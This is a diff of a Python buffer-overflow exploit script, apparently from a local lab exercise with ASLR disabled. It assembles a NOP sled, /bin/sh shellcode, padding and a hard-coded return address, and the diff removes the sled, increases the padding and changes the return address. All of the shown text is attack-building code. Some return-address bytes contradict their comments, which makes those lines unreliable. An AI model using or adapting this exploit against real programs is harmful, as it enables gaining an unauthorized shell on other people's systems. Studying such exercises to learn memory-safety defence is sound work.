@@ -11,7 +11,7 @@ gdb_mode = len(sys.argv) > 1 and sys.argv[1] == "--gdb"
 # Total: 114 bytes (110 bytes payload + 4 bytes return address)
 
 # 1. NOP sled (32 bytes)
-nop_sled = b"\x90" * 32
+nop_sled = b"\x90" * 0
 
 # 2. Shellcode to spawn /bin/sh (25 bytes)
 shellcode = (
@@ -24,7 +24,7 @@ shellcode = (
 # 3. Padding to reach the saved return address (53 bytes)
 # Empirically: 110 bytes before return address works
 # 110 - (32 + 25) = 53
-padding = b"A" * 53
+padding = b"A" * 86
 
 # 4. Return address pointing into the NOP sled (little endian)
 # With ASLR disabled and 112-byte offset:
@@ -33,17 +33,12 @@ padding = b"A" * 53
 
 if gdb_mode:
     #ret_addr = b"\x5c\xc8\xff\xff"  # For gdb: 0xffffc85c
-    ret_addr = b"\x9c\xcc\x8a\xff"  # For gdb: 0xffff8acc
-    ret_addr_val = 0xff8acc9c
+    ret_addr = b"\x9c\xcc\x8a\xff"  # For gdb: 0xffff8acc    
     print("Mode: GDB", file=sys.stderr)
 else:
-    ret_addr = b"\xb0\xc8\xff\xff"  # For normal: 0xffffc8b0
-    ret_addr_val = 0xffffc8b0
+    ret_addr = b"\xcc\xc8\xff\xff"  # For normal: 0xffffc8b0
     print("Mode: Normal execution", file=sys.stderr)
 
-
-# Print the return address used
-print(f"[+] Return address used: {hex(ret_addr_val)}")
 
 # Construct final exploit buffer
 exploit = nop_sled + shellcode + padding + ret_addr
